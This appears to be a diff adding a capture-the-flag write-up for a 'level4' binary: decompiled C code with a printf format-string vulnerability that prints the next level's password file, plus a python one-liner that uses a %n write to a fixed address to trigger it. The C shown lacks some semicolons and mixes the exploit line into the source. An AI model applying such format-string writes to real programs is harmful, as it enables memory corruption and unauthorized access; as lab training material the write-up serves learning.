@@ -1,0 +1,25 @@
+int m; // 0x08 04 98 10
+
+void p(char *buff)
+{
+	printf(buff)
+}
+
+void n(void)
+{
+	char	buff[512];
+
+	fgets(buff, 512, stdin)
+	p(buff);
+	if (m == 0x1025544) // 16930116
+		system("/bin/cat /home/user/level5/.pass");
+}
+
+
+python -c 'print "\x10\x98\x04\x08" + "A" * 16930112 + "%12$n"' | ./level4
+
+
+int main(void)
+{
+	n();
+}
